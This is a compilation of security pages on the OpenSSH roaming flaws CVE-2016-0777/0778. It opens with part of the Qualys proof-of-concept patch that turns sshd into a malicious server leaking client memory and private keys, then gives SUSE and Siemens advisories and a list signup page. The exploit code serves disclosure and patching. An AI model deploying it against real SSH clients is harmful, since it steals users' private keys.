+       if (overflow != 0) {
+               const u_int64_t full_client_out_buf = get_recv_bytes() +
+                                    client_out_buf_size;
+
+               u_int fd_leaks = 4 * 8 * 8; /* MIN_CHUNK_SIZE in bits */
+               if ((cp = strstr(roaming, "fd_leaks:")) != NULL)
+                       fd_leaks = strtoul(cp + 9, NULL, 0);
+               debug("%s: fd_leaks %u", __func__, fd_leaks);
+
+               while (fd_leaks--) {
+                       packet_start(SSH2_MSG_CHANNEL_OPEN);
+                       packet_put_cstring(overflow == 'X' ? "x11" :
+                           "auth-agent () openssh com"); /* ctype */
+                       packet_put_int(arc4random()); /* server channel */
+                       packet_put_int(arc4random()); /* server window */
+                       packet_put_int(arc4random()); /* server maxpacket */
+                       if (overflow == 'X') {
+                               packet_put_cstring(""); /* originator */
+                               packet_put_int(arc4random()); /* port */
+                       }
+                       packet_send();
+
+                       packet_read_expect(SSH2_MSG_CHANNEL_OPEN_CONFIRMATION);
+                       packet_get_int(); /* server channel */
+                       packet_get_int(); /* client channel */
+                       packet_get_int(); /* client window */
+                       packet_get_int(); /* client maxpacket */
+                       packet_check_eom();
+               }
+
+               while (get_recv_bytes() <= full_client_out_buf) {
+                       packet_start(SSH2_MSG_GLOBAL_REQUEST);
+                       packet_put_cstring(""); /* rtype */
+                       packet_put_char(1); /* want_reply */
+                       packet_send();
+
+                       packet_read_expect(SSH2_MSG_REQUEST_FAILURE);
+                       packet_check_eom();
+               }
+
+               if (kex == NULL)
+                       fatal("%s: no kex, cannot rekey", __func__);
+               if (kex->flags & KEX_INIT_SENT)
+                       fatal("%s: KEX_INIT_SENT already", __func__);
+               char *const ptr = buffer_ptr(&kex->my);
+               const u_int len = buffer_len(&kex->my);
+               if (len <= 1+4) /* first_kex_follows + reserved */
+                       fatal("%s: kex len %u", __func__, len);
+               ptr[len - (1+4)] = 1; /* first_kex_follows */
+               kex_send_kexinit(kex);
+
+               u_int i;
+               packet_read_expect(SSH2_MSG_KEXINIT);
+               for (i = 0; i < KEX_COOKIE_LEN; i++)
+                       packet_get_char();
+               for (i = 0; i < PROPOSAL_MAX; i++)
+                       free(packet_get_string(NULL));
+               packet_get_char(); /* first_kex_follows */
+               packet_get_int(); /* reserved */
+               packet_check_eom();
+
+               char buf[8192*2]; /* two packet_read_seqnr bufferfuls */
+               memset(buf, '\0', sizeof(buf));
+               packet_start(SSH2_MSG_KEX_ROAMING_AUTH_FAIL);
+               packet_put_string(buf, sizeof(buf));
+               packet_send();
+               const Buffer *const output = packet_get_output();
+               dump_roaming_file("output", buffer_ptr(output),
+                                           buffer_len(output));
+       }
+
+       const u_int64_t client_write_bytes = get_recv_bytes();
+       debug("%s: client_write_bytes %llu", __func__,
+           (unsigned long long)client_write_bytes);
+       dump_roaming_file("client_write_bytes", &client_write_bytes,
+                                         sizeof(client_write_bytes));
+       fatal("%s: all done for %s", __func__, dir);
+}
+
+static void
 server_input_global_request(int type, u_int32_t seq, void *ctxt)
 {
        char *rtype;
@@ -1168,6 +1371,13 @@ server_input_global_request(int type, u_
        } else if (strcmp(rtype, "no-more-sessions () openssh com") == 0) {
                no_more_sessions = 1;
                success = 1;
+       } else if (strcmp(rtype, ROAMING_REQUEST) == 0) {
+               if (want_reply != 1)
+                       fatal("%s: rtype %s want_reply %d", __func__,
+                                  rtype, want_reply);
+               roaming_disconnect(ctxt);
+               /* NOTREACHED */
+               fatal("%s: returned from %s", __func__, ROAMING_REQUEST);
        }
        if (want_reply) {
                packet_start(success ?
diff -pruN openssh-6.4p1/sshd.c openssh-6.4p1+roaming/sshd.c
--- openssh-6.4p1/sshd.c        2013-07-19 20:21:53.000000000 -0700
+++ openssh-6.4p1+roaming/sshd.c        2016-01-07 01:04:15.000000000 -0800
@@ -2432,6 +2432,8 @@ do_ssh2_kex(void)
        }
        if (options.kex_algorithms != NULL)
                myproposal[PROPOSAL_KEX_ALGS] = options.kex_algorithms;
+       else
+               myproposal[PROPOSAL_KEX_ALGS] = KEX_DEFAULT_KEX "," KEX_RESUME;

        if (options.rekey_limit || options.rekey_interval)
                packet_set_rekey_limits((u_int32_t)options.rekey_limit,

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](43)
[By Date](date.html#44)
[![Next](/images/right-icon-16x16.png)](45)

[![Previous](/images/left-icon-16x16.png)](43)
[By Thread](index.html#44)
[![Next](/images/right-icon-16x16.png)](45)

### Current thread:

* **Qualys Security Advisory - Roaming through the OpenSSH client: CVE-2016-0777 and CVE-2016-0778** *Qualys Security Advisory (Jan 15)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from lists.ubuntu.com_be8ed54b_20250126_125209.html ===


| **ubuntu-hardened -- Ubuntu security discussion** | |
| --- | --- |
|  | |
| **About ubuntu-hardened** | English (USA)   Chinese (Taiwan) |
| Discussion on Ubuntu security updates, development of new security technologies, and general "hardening" of the operating system.  A place to talk about MAC systems (SELinux, AppArmor, Smack) in Ubuntu, about both kernel-level and user-land security improvements and technologies, etc.  To see the collection of prior postings to the list, visit the [ubuntu-hardened Archives](https://lists.ubuntu.com/archives/ubuntu-hardened). | |
| **Using ubuntu-hardened** | |
| To post a message to all the list members, send email to ubuntu-hardened@lists.ubuntu.com. You can subscribe to the list, or change your existing subscription, in the sections below. | |
| **Subscribing to ubuntu-hardened** | |
| Subscribe to ubuntu-hardened by filling out the following form. You will be sent email requesting confirmation, to prevent others from gratuitously subscribing you. This is a hidden list, which means that the list of members is available only to the list administrator.    | Your email address: |  |  | | --- | --- | --- | | Your name (optional): |  |  | | You may enter a privacy password below. This provides only mild security, but should prevent others from messing with your subscription. **Do not use a valuable password** as it will occasionally be emailed back to you in cleartext. If you choose not to enter a password, one will be automatically generated for you, and it will be sent to you once you've confirmed your subscription. You can always request a mail-back of your password when you edit your personal options. | | | | Pick a password: |  |  | | Reenter password to confirm: |  |  | | Which language do you prefer to display your messages? | English (USA)   Chinese (Taiwan) |  | | Would you like to receive list mail batched in a daily digest? | No  Yes | |  | | | | |

| **ubuntu-hardened Subscribers** | |
| (*The subscribers list is only available to the list administrator.*) Enter your admin address and password to visit the subscribers list: Admin address: Password:  To unsubscribe from ubuntu-hardened, get a password reminder, or change your subscription options enter your subscription email address: If you leave the field blank, you will be prompted for your email address | |

---

[ubuntu-hardened](../listinfo/ubuntu-hardened) list run by jamie at ubuntu.com, mdeslaur at ubuntu.com, sbeattie at ubuntu.com, alex.murray at canonical.com
[ubuntu-hardened administrative interface](../admin/ubuntu-hardened) (requires authorization)
[Overview of all lists.ubuntu.com mailing lists](../listinfo)

| [Delivered by Mailmanversion 2.1.20](http://www.gnu.org/software/mailman/index.html) | [Python Powered](http://www.python.org/) | [GNU's Not Unix](http://www.gnu.org/) | [Debian Powered](http://www.debian.org/) |
| --- | --- | --- | --- |

[![](http://tuxedo-es.org/images/hardened_debian.png)](http://www.debian-hardened.org)



=== Content from lists.opensuse.org_cfc052a8_20250125_234720.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/IBTAJUYGJ5LD4PQCDBTI2OSAJ47IBZAN/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/IBTAJUYGJ5LD4PQCDBTI2OSAJ47IBZAN/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/IBTAJUYGJ5LD4PQCDBTI2OSAJ47IBZAN/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/IBTAJUYGJ5LD4PQCDBTI2OSAJ47IBZAN/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/IBTAJUYGJ5LD4PQCDBTI2OSAJ47IBZAN/#IBTAJUYGJ5LD4PQCDBTI2OSAJ47IBZAN)

# [security-announce] SUSE-SU-2016:0120-1: critical: Security update for openssh

![](https://seccdn.libravatar.org/avatar/099a17325bdf082b643d1a6bbacde279.jpg?s=120&d=mm&r=g)
## [opensuse-security＠opensuse.org](/archives/users/1b72def497ef4503896cd7a5fe9fb8e0/ "See the profile for opensuse-security＠opensuse.org")

14 Jan
2016

14 Jan
'16

19:13

SUSE Security Update: Security update for openssh
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: SUSE-SU-2016:0120-1
Rating: critical
References: #961642 #961645
Cross-References: CVE-2016-0777 CVE-2016-0778
Affected Products:
SUSE Linux Enterprise Server 11-SP4
SUSE Linux Enterprise Desktop 11-SP4
SUSE Linux Enterprise Debuginfo 11-SP4
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that fixes two vulnerabilities is now available.
Description:
This update for openssh fixes the following issues:
- CVE-2016-0777: A malicious or compromised server could cause the OpenSSH
client to expose part or all of the client's private key through the
roaming feature (bsc#961642)
- CVE-2016-0778: A malicious or compromised server could could trigger a
buffer overflow in the OpenSSH client through the roaming feature
(bsc#961645)
This update disables the undocumented feature supported by the OpenSSH
client and a commercial SSH server.
Patch Instructions:
To install this SUSE Security Update use YaST online\_update.
Alternatively you can run the command listed for your product:
- SUSE Linux Enterprise Server 11-SP4:
zypper in -t patch slessp4-openssh-2016011302-12326=1
- SUSE Linux Enterprise Desktop 11-SP4:
zypper in -t patch sledsp4-openssh-2016011302-12326=1
- SUSE Linux Enterprise Debuginfo 11-SP4:
zypper in -t patch dbgsp4-openssh-2016011302-12326=1
To bring your system up-to-date, use "zypper patch".
Package List:
- SUSE Linux Enterprise Server 11-SP4 (i586 ia64 ppc64 s390x x86\_64):
openssh-6.6p1-16.1
openssh-askpass-gnome-6.6p1-16.4
openssh-fips-6.6p1-16.1
openssh-helpers-6.6p1-16.1
- SUSE Linux Enterprise Desktop 11-SP4 (i586 x86\_64):
openssh-6.6p1-16.1
openssh-askpass-gnome-6.6p1-16.4
openssh-helpers-6.6p1-16.1
- SUSE Linux Enterprise Debuginfo 11-SP4 (i586 ia64 ppc64 s390x x86\_64):
openssh-askpass-gnome-debuginfo-6.6p1-16.4
openssh-debuginfo-6.6p1-16.1
openssh-debugsource-6.6p1-16.1
References:
<https://www.suse.com/security/cve/CVE-2016-0777.html>
<https://www.suse.com/security/cve/CVE-2016-0778.html>
<https://bugzilla.suse.com/961642>
<https://bugzilla.suse.com/961645>
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/IBTAJUYGJ5LD4PQCDBTI2OSAJ47IBZAN/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/IBTAJUYGJ5LD4PQCDBTI2OSAJ47IBZAN/#IBTAJUYGJ5LD4PQCDBTI2OSAJ47IBZAN)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.



=== Content from cert-portal.siemens.com_7f5e184c_20250125_234741.html ===
Siemens Security Advisory by Siemens ProductCERT

SSA-412672: Multiple OpenSSL and OpenSSH Vulnerabilities in
SCALANCE X-200RNA Switch Devices before V3.2.7

Publication Date:
Last Update:
Current Version:
CVSS v3.1 Base Score: 9.8

2022-12-13
2022-12-13
V1.0

SUMMARY

SCALANCE X-200RNA switch devices before V3.2.7 contain multiple OpenSSL and OpenSSH vulnera-
bilities. The most severe of these vulnerabilities could allow a denial of service condition or could lead to
execution of arbitrary code.

Siemens has released updates for the affected products and recommends to update to the latest versions.

AFFECTED PRODUCTS AND SOLUTION

Affected Product and Versions

Remediation

SCALANCE X204RNA (HSR) (6GK5204-0BA00-
2MB2):
All versions < V3.2.7

SCALANCE X204RNA (PRP) (6GK5204-0BA00-
2KB2):
All versions < V3.2.7

SCALANCE X204RNA EEC (HSR) (6GK5204-
0BS00-2NA3):
All versions < V3.2.7

SCALANCE X204RNA EEC (PRP) (6GK5204-
0BS00-3LA3):
All versions < V3.2.7

SCALANCE
X204RNA
(6GK5204-0BS00-3PA3):
All versions < V3.2.7

EEC (PRP/HSR)

Update to V3.2.7 or later version
https://support.industry.siemens.com/cs/ww/en/
view/109814809/
See further
Workarounds and Mitigations

recommendations from section

Update to V3.2.7 or later version
https://support.industry.siemens.com/cs/ww/en/
view/109814809/
See further
Workarounds and Mitigations

recommendations from section

Update to V3.2.7 or later version
https://support.industry.siemens.com/cs/ww/en/
view/109814809/
See further
Workarounds and Mitigations

recommendations from section

Update to V3.2.7 or later version
https://support.industry.siemens.com/cs/ww/en/
view/109814809/
See further
Workarounds and Mitigations

recommendations from section

Update to V3.2.7 or later version
https://support.industry.siemens.com/cs/ww/en/
view/109814809/
See further
Workarounds and Mitigations

recommendations from section

WORKAROUNDS AND MITIGATIONS

Siemens has identiﬁed the following speciﬁc workarounds and mitigations that customers can apply to
reduce the risk:

• Restrict access to the affected systems, especially to ports 22/tcp and 443/tcp to trusted IP

addresses only

• Deactivate the webserver if not required, and if deactivation is supported by the product

SSA-412672

© Siemens 2022

Page 1 of 19

Siemens Security Advisory by Siemens ProductCERT

Product-speciﬁc remediations or mitigations can be found in the section Affected Products and Solution.
Please follow the General Security Recommendations.

GENERAL SECURITY RECOMMENDATIONS

As a general security measure, Siemens strongly recommends to protect network access to devices
with appropriate mechanisms. In order to operate the devices in a protected IT environment, Siemens
recommends to conﬁgure the environment according to Siemens’ operational guidelines for Industrial
Security (Download: https://www.siemens.com/cert/operational-guidelines-industrial-security), and to
follow the recommendations in the product manuals.

Additional information on Industrial Security by Siemens can be found at: https://www.siemens.com/
industrialsecurity

PRODUCT DESCRIPTION

The SCALANCE X-204RNA Industrial Ethernet network access points enable the cost-effective connection
of non-PRP terminal devices to separate parallel networks, where a high availability is required.

VULNERABILITY CLASSIFICATION

The vulnerability classiﬁcation has been performed by using the CVSS scoring system in version 3.1
(CVSS v3.1) (https://www.ﬁrst.org/cvss/). The CVSS environmental score is speciﬁc to the customer’s
environment and will impact the overall CVSS score. The environmental score should therefore be
individually deﬁned by the customer to accomplish ﬁnal scoring.

An additional classiﬁcation has been performed using the CWE classiﬁcation, a community-developed list
of common software security weaknesses. This serves as a common language and as a baseline for
weakness identiﬁcation, mitigation, and prevention efforts. A detailed list of CWE classes can be found at:
https://cwe.mitre.org/.

Vulnerability CVE-2003-0190

OpenSSH-portable (OpenSSH) 3.6.1p1 and earlier with PAM support enabled immediately sends
an error message when a user does not exist, which allows remote attackers to determine valid
usernames via a timing attack.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:P/RL:O/RC:C
CWE-208: Observable Timing Discrepancy

Vulnerability CVE-2003-1562

sshd in OpenSSH 3.6.1p2 and earlier, when PermitRootLogin is disabled and using PAM keyboard-
interactive authentication, does not insert a delay after a root login attempt with the correct password,
which makes it easier for remote attackers to use timing differences to determine if the password step
of a multi-step authentication is successful, a different vulnerability than CVE-2003-0190.

CVSS v3.1 Base Score
CVSS Vector
CWE

8.1
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
CWE-362: Concurrent Execution using Shared Resource with Im-
proper Synchronization (’Race Condition’)

SSA-412672

© Siemens 2022

Page 2 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2014-8176

The dtls1_clear_queues function in ssl/d1_lib.c in OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and
1.0.1 before 1.0.1h frees data structures without considering that application data can arrive between
a ChangeCipherSpec message and a Finished message, which allows remote DTLS peers to cause a
denial of service (memory corruption and application crash) or possibly have unspeciﬁed other impact
via unexpected application data.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C
CWE-119: Improper Restriction of Operations within the Bounds of a
Memory Buffer

Vulnerability CVE-2015-0207

The dtls1_listen function in d1_lib.c in OpenSSL 1.0.2 before 1.0.2a does not properly isolate the state
information of independent data streams, which allows remote attackers to cause a denial of service
(application crash) via crafted DTLS trafﬁc, as demonstrated by DTLS 1.0 trafﬁc to a DTLS 1.2 server.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-20: Improper Input Validation

Vulnerability CVE-2015-0208

The ASN.1 signature-veriﬁcation implementation in the rsa_item_verify function in crypto/r-
sa/rsa_ameth.c in OpenSSL 1.0.2 before 1.0.2a allows remote attackers to cause a denial of service
(NULL pointer dereference and application crash) via crafted RSA PSS parameters to an endpoint
that uses the certiﬁcate-veriﬁcation feature.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-476: NULL Pointer Dereference

Vulnerability CVE-2015-0209

Use-after-free vulnerability in the d2i_ECPrivateKey function in crypto/ec/ec_asn1.c in OpenSSL
before 0.9.8zf, 1.0.0 before 1.0.0r, 1.0.1 before 1.0.1m, and 1.0.2 before 1.0.2a might allow remote
attackers to cause a denial of service (memory corruption and application crash) or possibly have
unspeciﬁed other impact via a malformed Elliptic Curve (EC) private-key ﬁle that is improperly handled
during import.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C
CWE-416: Use After Free

Vulnerability CVE-2015-0285

The ssl3_client_hello function in s3_clnt.c in OpenSSL 1.0.2 before 1.0.2a does not ensure that the
PRNG is seeded before proceeding with a handshake, which makes it easier for remote attackers to
defeat cryptographic protection mechanisms by snifﬁng the network and then conducting a brute-force
attack.

CVSS v3.1 Base Score
CVSS Vector
CWE

4.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N/E:P/RL:O/RC:C
CWE-310: Cryptographic Issues

SSA-412672

© Siemens 2022

Page 3 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2015-0286

The ASN1_TYPE_cmp function in crypto/asn1/a_type.c in OpenSSL before 0.9.8zf, 1.0.0 before 1.0.0r,
1.0.1 before 1.0.1m, and 1.0.2 before 1.0.2a does not properly perform boolean-type comparisons,
which allows remote attackers to cause a denial of service (invalid read operation and application
crash) via a crafted X.509 certiﬁcate to an endpoint that uses the certiﬁcate-veriﬁcation feature.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-1024: Comparison of Incompatible Types

Vulnerability CVE-2015-0287

The ASN1_item_ex_d2i function in crypto/asn1/tasn_dec.c in OpenSSL before 0.9.8zf, 1.0.0 before
1.0.0r, 1.0.1 before 1.0.1m, and 1.0.2 before 1.0.2a does not reinitialize CHOICE and ADB data
structures, which might allow attackers to cause a denial of service (invalid write operation and
memory corruption) by leveraging an application that relies on ASN.1 structure reuse.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-119: Improper Restriction of Operations within the Bounds of a
Memory Buffer

Vulnerability CVE-2015-0288

The X509_to_X509_REQ function in crypto/x509/x509_req.c in OpenSSL before 0.9.8zf, 1.0.0 before
1.0.0r, 1.0.1 before 1.0.1m, and 1.0.2 before 1.0.2a might allow attackers to cause a denial of service
(NULL pointer dereference and application crash) via an invalid certiﬁcate key.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-476: NULL Pointer Dereference

Vulnerability CVE-2015-0289

The PKCS#7 implementation in OpenSSL before 0.9.8zf, 1.0.0 before 1.0.0r, 1.0.1 before 1.0.1m,
and 1.0.2 before 1.0.2a does not properly handle a lack of outer ContentInfo, which allows attackers
to cause a denial of service (NULL pointer dereference and application crash) by leveraging an
application that processes arbitrary PKCS#7 data and providing malformed data with ASN.1 encoding,
related to crypto/pkcs7/pk7_doit.c and crypto/pkcs7/pk7_lib.c.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-476: NULL Pointer Dereference

Vulnerability CVE-2015-0290

The multi-block feature in the ssl3_write_bytes function in s3_pkt.c in OpenSSL 1.0.2 before 1.0.2a on
64-bit x86 platforms with AES NI support does not properly handle certain non-blocking I/O cases,
which allows remote attackers to cause a denial of service (pointer corruption and application crash)
via unspeciﬁed vectors.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-476: NULL Pointer Dereference

SSA-412672

© Siemens 2022

Page 4 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2015-0291

The sigalgs implementation in t1_lib.c in OpenSSL 1.0.2 before 1.0.2a allows remote attackers
to cause a denial of service (NULL pointer dereference and daemon crash) by using an invalid
signature_algorithms extension in the ClientHello message during a renegotiation.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-476: NULL Pointer Dereference

Vulnerability CVE-2015-0292

Integer underﬂow in the EVP_DecodeUpdate function in crypto/evp/encode.c in the base64-decoding
implementation in OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h allows
remote attackers to cause a denial of service (memory corruption) or possibly have unspeciﬁed other
impact via crafted base64 data that triggers a buffer overﬂow.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C
CWE-119: Improper Restriction of Operations within the Bounds of a
Memory Buffer

Vulnerability CVE-2015-0293

The SSLv2 implementation in OpenSSL before 0.9.8zf, 1.0.0 before 1.0.0r, 1.0.1 before 1.0.1m, and
1.0.2 before 1.0.2a allows remote attackers to cause a denial of service (s2_lib.c assertion failure and
daemon exit) via a crafted CLIENT-MASTER-KEY message.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-20: Improper Input Validation

Vulnerability CVE-2015-1787

The ssl3_get_client_key_exchange function in s3_srvr.c in OpenSSL 1.0.2 before 1.0.2a, when client
authentication and an ephemeral Difﬁe-Hellman ciphersuite are enabled, allows remote attackers to
cause a denial of service (daemon crash) via a ClientKeyExchange message with a length of zero.

CVSS v3.1 Base Score
CVSS Vector
CWE

3.7
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-20: Improper Input Validation

Vulnerability CVE-2015-1788

The BN_GF2m_mod_inv function in crypto/bn/bn_gf2m.c in OpenSSL before 0.9.8s, 1.0.0 before
1.0.0e, 1.0.1 before 1.0.1n, and 1.0.2 before 1.0.2b does not properly handle ECParameters structures
in which the curve is over a malformed binary polynomial ﬁeld, which allows remote attackers to cause
a denial of service (inﬁnite loop) via a session that uses an Elliptic Curve algorithm, as demonstrated
by an attack against a server that supports client authentication.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-399: Resource Management Errors

SSA-412672

© Siemens 2022

Page 5 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2015-1789

The X509_cmp_time function in crypto/x509/x509_vfy.c in OpenSSL before 0.9.8zg, 1.0.0 before
1.0.0s, 1.0.1 before 1.0.1n, and 1.0.2 before 1.0.2b allows remote attackers to cause a denial of
service (out-of-bounds read and application crash) via a crafted length ﬁeld in ASN1_TIME data,
as demonstrated by an attack against a server that supports client authentication with a custom
veriﬁcation callback.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-119: Improper Restriction of Operations within the Bounds of a
Memory Buffer

Vulnerability CVE-2015-1790

The PKCS7_dataDecodefunction in crypto/pkcs7/pk7_doit.c in OpenSSL before 0.9.8zg, 1.0.0 before
1.0.0s, 1.0.1 before 1.0.1n, and 1.0.2 before 1.0.2b allows remote attackers to cause a denial of service
(NULL pointer dereference and application crash) via a PKCS#7 blob that uses ASN.1 encoding and
lacks inner EncryptedContent data.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-476: NULL Pointer Dereference

Vulnerability CVE-2015-1791

Race condition in the ssl3_get_new_session_ticket function in ssl/s3_clnt.c in OpenSSL before 0.9.8zg,
1.0.0 before 1.0.0s, 1.0.1 before 1.0.1n, and 1.0.2 before 1.0.2b, when used for a multi-threaded client,
allows remote attackers to cause a denial of service (double free and application crash) or possibly
have unspeciﬁed other impact by providing a NewSessionTicket during an attempt to reuse a ticket
that had been obtained earlier.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C
CWE-362: Concurrent Execution using Shared Resource with Im-
proper Synchronization (’Race Condition’)

Vulnerability CVE-2015-1792

The do_free_upto function in crypto/cms/cms_smime.c in OpenSSL before 0.9.8zg, 1.0.0 before
1.0.0s, 1.0.1 before 1.0.1n, and 1.0.2 before 1.0.2b allows remote attackers to cause a denial of
service (inﬁnite loop) via vectors that trigger a NULL value of a BIO data structure, as demonstrated
by an unrecognized X.660 OID for a hash function.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-399: Resource Management Errors

Vulnerability CVE-2015-1794

The ssl3_get_key_exchange function in ssl/s3_clnt.c in OpenSSL 1.0.2 before 1.0.2e allows remote
servers to cause a denial of service (segmentation fault) via a zero p value in an anonymous Difﬁe-
Hellman (DH) ServerKeyExchange message.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-682: Incorrect Calculation

SSA-412672

© Siemens 2022

Page 6 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2015-3193

The Montgomery squaring implementation in crypto/bn/asm/x86_64-mont5.pl in OpenSSL 1.0.2 before
